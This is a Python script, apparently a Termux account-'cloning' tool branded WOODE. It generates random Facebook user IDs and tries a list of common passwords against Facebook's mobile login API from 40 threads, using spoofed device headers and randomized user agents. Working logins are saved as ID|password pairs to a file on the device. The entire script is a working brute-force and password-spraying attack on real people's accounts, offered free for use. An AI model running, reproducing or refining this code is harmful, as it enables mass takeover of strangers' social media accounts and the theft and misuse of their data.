#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\033[1;34m═══════════════════════════════════════════════")
#----------------------------[DATE]-----------------------------------#
    
def joined(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = '2009'
        elif uid[:9] in ['100000000']       :shanto = '2009'
        elif uid[:8] in ['10000000']        :shanto = '2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = '2010'
        elif uid[:6] in ['100001']          :shanto = '2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = '2011/2012'
        elif uid[:6] in ['100004']          :shanto = '2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = '2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = '2014/2015'
        elif uid[:6] in ['100009']          :shanto = '2015'
        elif uid[:5] in ['10001']           :shanto = '2015/2016'
        elif uid[:5] in ['10002']           :shanto = '  2016/2017'
        elif uid[:5] in ['10003']           :shanto = '  2018/2019'
        elif uid[:5] in ['10004']           :shanto = '  2019/2020'
        elif uid[:5] in ['10005']           :shanto = '  2020'
        elif uid[:5] in ['10006','10007','']:shanto = '  2021'
        elif uid[:5] in ['10008']           :shanto = '  2022'
        elif uid[:5] in ['10009']           :shanto = '  2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = '2008/2009'
    elif len(uid)==8:
        shanto = '2007/2008'
    elif len(uid)==7:
        shanto = '2006/2007'
    else:shanto=''
    return shanto
#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx
#----------------------------[LOGO]-----------------------------------#
logo=(f"""\033[1;37m
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32m╭╮╭╮╭┳━━━┳━━━┳━━━┳━━━╮
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32m┃┃┃┃┃┃╭━╮┃╭━╮┣╮╭╮┃╭━━╯
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32m┃┃┃┃┃┃┃╱┃┃┃╱┃┃┃┃┃┃╰━━╮
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32m┃╰╯╰╯┃┃╱┃┃┃╱┃┃┃┃┃┃╭━━╯
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32m╰╮╭╮╭┫╰━╯┃╰━╯┣╯╰╯┃╰━━╮
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32m╱╰╯╰╯╰━━━┻━━━┻━━━┻━━━╯
\033[1;34m═══════════════════════════════════════════════
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mGITHUB  \033[1;37m: \033[1;37m[\033[1;31m WOODE \033[1;37m] \033[1;32m
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mSERVICE \033[1;37m: \033[1;37m[\033[1;34m FREE \033[1;37m] \033[1;32m
\033[1;34m══════════════════════════════════════""")
def linex():
    print('\033[1;34m══════════════════════════════════════')
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f'\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mEXAMPLE   : \033[1;37m10000 | 20000 | 90000')
    lin()
    limit=input("\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mCHOICE    : ")
    lin()
    os.system('clear')
    print(logo)
    print("\033[1;37m[\033[1;31m1\033[1;37m] \033[1;32mMETHOD : \033[1;37m[\033[1;31m2010-2009\033[1;37m] \033[1;37m ")
    lin()
    ask=input("\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mCHOICE    : ")
    lin()
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)    
    with ThreadPool(max_workers=40) as MrDevilEx:
        os.system('clear')
        print(logo)
        print(f'\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mTOTAL ID : {limit} ')
        print(f'\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mIF NO RESULT \033[1;37m[\033[1;32mON/\033[1;31mOFF\033[1;37m] \033[1;32mAIRPLAN MODE')
        lin()
        for mal in user:
            uid=star+mal
            MrDevilEx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write('\r\r\033[1;31m[\033[1;37mWOODE\033[1;31m]–[\033[1;37m%s\033[1;31m]–[\033[1;32mOK\033[1;31m|\033[1;32m%s\033[1;31m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print('\r\r\033[1;31m[\033[1;32mWOODE-OK\033[1;31m] \033[1;32m'+uid+' \033[1;31m| \033[1;32m'+pw+' \033[1;31m|| \033[1;31m'+joined(uid)+'\033[1;97m')                 
                open("/sdcard/WOODE-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print('\r\r\033[1;31m[\033[1;32mWOODE-OK\033[1;31m] \033[1;32m'+uid+' \033[1;31m| \033[1;32m'+pw+' \033[1;31m| \033[1;31m'+joined(uid)+'\033[1;97m')                 
                open("/sdcard/WOODE-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print('\r\r\033[1;31m[\033[1;32mWOODE-OK\033[1;31m] \033[1;32m'+uid+' \033[1;31m| \033[1;32m'+pw+' \033[1;31m| \033[1;31m'+joined(uid)+'\033[1;97m')                 
                open("/sdcard/WOODE-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
main()
